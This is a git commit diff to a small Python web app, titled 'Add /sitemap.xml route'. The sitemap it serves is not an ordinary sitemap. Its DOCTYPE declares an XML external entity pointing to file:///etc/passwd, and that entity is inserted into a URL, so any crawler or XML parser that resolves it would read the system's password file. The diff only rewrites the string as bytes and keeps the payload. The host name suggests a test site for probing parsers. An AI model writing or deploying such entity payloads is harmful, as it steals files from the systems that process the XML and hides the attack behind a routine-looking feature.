6755fb32656d4164823d98ef082f7b963508c4f6
w41bu1 <buivanyk4@gmail.com>
2025-09-29 01:01:12 +0700

    Add /sitemap.xml route

--- api/index.py
+++ api/index.py
@@ -17,19 +17,19 @@ def about():
 
 @app.route("/sitemap.xml")
 def sitemap():
-    xml_content = textwrap.dedent("""\
-    <?xml version="1.0" encoding="UTF-8"?>
-    <!DOCTYPE urlset [
-        <!ENTITY xxe SYSTEM "file:///etc/passwd">
-    ]>
-    <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
-        <url>
-            <loc>https://w41test.vercel.app/?=&xxe;</loc>
-            <lastmod>2025-07-30</lastmod>
-            <changefreq>daily</changefreq>
-            <priority>1.0</priority>
-        </url>
-    </urlset>
-    """)
+    xml_bytes = (
+        b'<?xml version="1.0" encoding="UTF-8"?>'
+        b'<!DOCTYPE urlset ['
+        b'    <!ENTITY xxe SYSTEM "file:///etc/passwd">'
+        b']>'
+        b'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">'
+        b'<url>'
+        b'<loc>https://w41test.vercel.app/?=&xxe;</loc>'
+        b'<lastmod>2025-07-30</lastmod>'
+        b'<changefreq>daily</changefreq>'
+        b'<priority>1.0</priority>'
+        b'</url>'
+        b'</urlset>'
+    )
 
-    return Response(xml_content.encode("utf-8"), content_type="application/xml; charset=utf-8")
+    return Response(xml_bytes, content_type="application/xml; charset=utf-8")
